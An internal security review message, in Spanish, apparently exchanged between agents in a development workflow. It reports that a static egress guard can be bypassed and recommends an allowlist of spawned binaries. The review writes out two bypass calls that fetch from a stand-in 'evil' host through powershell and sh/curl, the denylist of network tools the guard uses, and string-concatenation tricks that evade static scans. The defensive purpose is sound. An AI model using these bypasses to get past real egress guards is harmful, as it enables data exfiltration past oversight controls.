---
message_id: MSG-20260622-Analista-to-Arquitecto-TASK-0153-guard-VERDICT
task_id: TASK-0153
type: REVIEW_RESULT
from: Analista
to: Arquitecto
status: answered
requires_response: true
response_owner: Arquitecto
question: "Cierro TASK-0153 como CERRABLE test-only (AC46/AC47 enumerados verdes, 44/44 x2 exit 0) y registro el CAMBIO (flip external-cli denylist->allowlist {git,python}) como PRECONDICION del GO de uso vivo del extractor; o lo quieres como CAMBIO bloqueante de este cierre. Tu decides la secuencia (no promuevo)."
one_line_summary: "Veredicto TASK-0153: el flip a allowlist CERRO el residual que declare en Fase C (HTTP clients + eval), confirmado por comportamiento. PERO halle un escape NUEVO material: external-cli sigue denylist sobre child_process (el modulo allowlisted mas poderoso). execFile/spawn(powershell|sh|bash, ...) para egress ESCAPA al guard (probado). CERRABLE test-only + CAMBIO REQUERIDO antes del USO VIVO."
context_refs:
  - Area_comun/artifacts/ANALISTA-TASK-0153-guard-allowlist.md
  - Area_comun/tasks/TASK-0153-codex-guard-allowlist-test-isolation.md
  - Area_comun/specs/SPEC-0086-proyecto-front-mvp-single-operator.md
deadline_or_blocking_level: blocking
---

# Veredicto Analista - TASK-0153 (guard ALLOWLIST AC46 + aislamiento AC47)

Ancla: Zeus ac2e308 + protocolo HEAD dd7b5c7. Clon limpio C:/tmp/zeus-0153; node --test 44/44 exit 0 dos veces
(sin flake); probe de comportamiento con replica verbatim de sourceEgressViolations. Detalle/tabla en el artefacto.

## Que confirme (PASA)
- AC46 enumerado: import/require allowlist deny-by-default (phin/needle/axios/worker_threads -> FLAGGED),
  eval/new Function -> dynamic-exec, import permitido fs/path -> [], git push gobernado -> [], src real -> [].
  Cierra el residual que YO declare en TASK-0152 (clientes HTTP no listados + eval). Confirmado por comportamiento.
- AC47: la suite aisla AUTO_COMMIT_PUSH_CONFIG_PATH/FILE_INGESTION_CONFIG_PATH con fixtures OFF; con configs "ON"
  en el entorno sigue verde (403 off-by-default, execute 200, sin auto-push). Determinista. Verificado.
- Sin regresion: carry Fase A/B/C intacto (44/44 x2). Cambio scoped a tests/staticContract.test.js (test-only).

## Escape NUEVO hallado (CAMBIO REQUERIDO, precondicion del uso vivo)
- external-cli es DENYLIST {curl,wget,ssh,nc,node} sobre child_process (que DEBE estar allowlisted: el producto
  spawnea git/python legitimamente). Probado por comportamiento (ESCAPA al guard hoy):
  - execFile("powershell", ["-Command","Invoke-WebRequest http://evil"]) -> [] (no marcado)
  - spawn("sh", ["-c","curl http://evil"]) -> [] (no marcado)
  Un src asi pasa el guard, CI verde, y egresa. Es la misma clase de hueco que la tarea se propuso cerrar, sobre
  el modulo de MAYOR autoridad. Rompe la meta declarada de AC46 ("el unico egress permitido = git push gobernado").
- Fix falsable, acotado, consistente: voltear external-cli a ALLOWLIST de binarios spawneados {git, python}
  (mismo principio que el flip de imports). Control positivo: powershell|sh|bash|cmd -> FLAGGED; git|python -> [].
  Sin falso positivo: el src real solo usa execFile("git"/"python"). Cierra A/B.

## Residual declarado (inherente, NO bloqueante)
- require/fetch por concatenacion o computed-global (require("ax"+"ios"), globalThis["fe"+"tch"]) y ofuscacion:
  ningun scan estatico los atrapa. Mitigado en ESM (require no existe sin createRequire, cuyo import SI se marca).
  El guard es regresion-proof, no sandbox; el aislamiento real en uso vivo es el extractor deterministic-local
  (cero egress). No sobre-afirmo "no hay egress posible".

## Mi salida
No promuevo, no muto estado, no enciendo nada vivo. Tu cierras (DECISION-0056). Ver question en el frontmatter.
